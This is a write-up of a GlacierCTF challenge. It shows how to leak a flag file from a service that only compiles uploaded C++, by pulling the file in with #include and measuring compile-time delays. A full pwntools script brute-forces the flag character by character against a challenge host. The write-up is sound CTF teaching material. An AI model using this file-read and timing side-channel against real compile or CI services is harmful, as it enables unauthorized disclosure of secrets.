# WriteUp for GlacierCTF Challenge: **Schrödinger Compiler**

The challenge is to exploit this shell script to get the flag.

```sh

#!/bin/sh

echo "[+] Welcome to the Schrödinger Compiler"
echo "[+] We definitely don't have a flag in /flag.txt"
echo "[+] Timeout is 3 seconds, you can run it locally with deploy.sh"

echo ""

echo "[+] Submit the base64 (EOF with a '@') of a .tar.gz compressed "
echo "    .cpp file and we'll compile it for you"
echo "[+] Example: tar cz main.cpp | base64 ; echo "@""
echo "[>] --- BASE64 INPUT START ---"
read -d @ FILE
echo "[>] --- BASE64 INPUT END ---"

DIR=$(mktemp -d)
cd ${DIR} &> /dev/null
echo "${FILE}" | base64 -d 2>/dev/null | tar -xzO > main.cpp 2> /dev/null
echo "[+] Compiling with g++ main.cpp &> /dev/null"
g++ main.cpp

# ./main
# oops we fogot to run it
echo "[+] Bye, it was a pleasure! Come back soon!"

```

## Exploitation

### Analysis

we can see that the script is taking a base64 encoded tar file, decoding it and extracting the contents to a file named `main.cpp` and then compiling it with `g++`.

The first thing that comes to mind is to use this trick from c++ for get the flag:

```cpp
const char * myString = {
    #include "/flag.txt"
};
```
Because it loads the content of the file into the string at compile time.

### Time attack

Now we need to find a way to get the content of myString, so we can use a time attack.

The idea is to have a cpp file that will take a lot of time to compile if a condition is not true.

```cpp
#include <format>
#include <cstdio>
#include <type_traits>
#include <string>

static constexpr const char * myString = {
    #include "/flag.txt"
};

#include <iostream>


template<int N>
struct Factorial {
    static const int value = N * Factorial<N - 1>::value;
};

template<>
struct Factorial<0> {
    static const int value = 1;
};


template <int N>
struct CompileTimeDelay {
    static void delay() {
        std::cout << Factorial<10>::value << std::endl;
        CompileTimeDelay<N - 1>::delay();
    }
};

template <>
struct CompileTimeDelay<0> {
    static void delay() {
    }
};

#define COMPILE_DELAY(N)     static_assert(N == 0 || N > 0, "Invalid delay value");     CompileTimeDelay<N>::delay();

        int main() {
            COMPILE_DELAY(myString[0] - 'g' ? 800 : 0);
            return 0;
        }
```
It's executing 800 times the factorial of 10 if the first character of the flag is not 'g'.
this code take approximately 1 seconds to compile if the first character of the flag is not 'g' and 0.3 seconds if it's 'g'.

### Solution

The code for the exploit is:

```python
from pwn import *
import os
import subprocess
import time
import string
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}"
context.log_level = 'warning'


text = '''

#include <format>
#include <cstdio>
#include <type_traits>
#include <string>

static constexpr const char * myString = {
    #include "/flag.txt"
};

#include <iostream>


//template factorial
template<int N>
struct Factorial {
    static const int value = N * Factorial<N - 1>::value;
};

template<>
struct Factorial<0> {
    static const int value = 1;
};


template <int N>
struct CompileTimeDelay {
    static void delay() {
        // Recursive unrolling: "doing work"
        std::cout << Factorial<10>::value << std::endl;
        CompileTimeDelay<N - 1>::delay();
    }
};

// Specialization to stop recursion when N == 0
template <>
struct CompileTimeDelay<0> {
    static void delay() {
        // factorial of 10
        // Base case: no recursion, effectively instant for N=0
    }
};

#define COMPILE_DELAY(N) \
    static_assert(N == 0 || N > 0, "Invalid delay value"); \
    CompileTimeDelay<N>::delay();
'''
flag = 'gctf{'
i = len(flag)
while True:
    char_to_time = []
    for c in chars:
        re = remote('78.47.52.31', 4126)
        (re.recvuntil(b'BASE64 INPUT START ---\n'))
        reste = '''
        int main() {
            COMPILE_DELAY(myString[%d] - '%c' ? 800 : 0);
            return 0;
        }
        ''' % (i, c)


        with open('to_compile.cpp','w') as f:
            f.write(text + reste)
            f.close()
        cmd = 'tar cz to_compile.cpp | base64'
        result = subprocess.check_output(cmd, shell=True)
        re.sendline(result)
        re.sendline(b'@')
        timestart = time.time()
        (re.recvall())
        result = time.time() - timestart
        print(c, result)
        if result < 0.5:
            char_to_time.append((c, result))
            re.close()
            break
        char_to_time.append((c, result))
        re.close()
    i += 1
    char_to_time.sort(key=lambda x: x[1])
    print(char_to_time)
    flag += char_to_time[0][0]
    print(flag)
```